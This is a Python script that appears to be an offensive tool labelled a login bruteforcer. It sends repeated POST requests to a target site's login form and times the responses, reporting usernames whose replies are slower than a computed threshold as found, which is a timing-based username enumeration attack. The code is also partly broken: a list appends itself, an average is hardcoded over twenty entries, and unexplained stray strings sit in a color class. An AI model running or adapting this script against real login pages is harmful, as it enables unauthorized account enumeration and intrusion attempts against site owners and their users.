import requests
import argparse

parser = argparse.ArgumentParser(description="Python Bruteforce Login")
parser.add_argument('--url', help="Website to target", required=True)
parser.add_argument('--ufield', help="Field of User in Petition", required=False)
parser.add_argument('--pfield', help="Field of Password in Petition", required=False)
parser.add_argument('--wordlist', help="Wordlist of passwords to use", required=True)
parser.add_argument('--agent', help="User agent string to send the login as", default="Agent:Mozilla/5.0")
args = parser.parse_args()


class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR

#proxy = {
#  'http': 'http://127.0.0.1:8080',
#}


post_fields = {'username': 'admin','password': 'pene'}

global timeout
timeout = 1

porcentaje_aumento = 25

response = requests.post(args.url, data=post_fields)

global list1
list1 = []

def load_words(WORDLIST_FILENAME):
       global line
       print("Calculated Time-Response...")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                pp = {'username': final_str,'password': 'a','user': final_str,'pass': 'a',args.ufield: final_str,args.pfield: 'a'}
                response = requests.post(args.url, data=pp,proxies=False)
                aaa = response.elapsed.total_seconds()
                list1.append(aaa)

wordlist = load_words("20words.txt")
op = list1[0] + list1[1] + list1[2] + list1[3] + list1[4] + list1[5] + list1[6] + list1[7] + list1[8] + list1[9] + list1[10] + list1[11] + list1[12] + list1[13] + list1[14] + list1[15] + list1[16] + list1[17] + list1[18] + list1[19]
op2 = op/20
print("Mean time of response are: ",op2)

tita = list1[12] / 1.5
op3 = op2 + tita

def load_words2(WORDLIST_FILENAME):
       global line
       print("-------------------------------------------------------------------------------------")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                pp = {'username': final_str,'password': 'a','user': final_str,'pass': 'a',args.ufield: final_str,args.pfield: 'a'}
                response = requests.post(args.url, data=pp,timeout=3.5)
                aaa = response.elapsed.total_seconds()
                if aaa > op3:
                  print(f"{bcolors.OK}User found: {bcolors.RESET}",final_str)

wordlist = load_words2(args.wordlist)

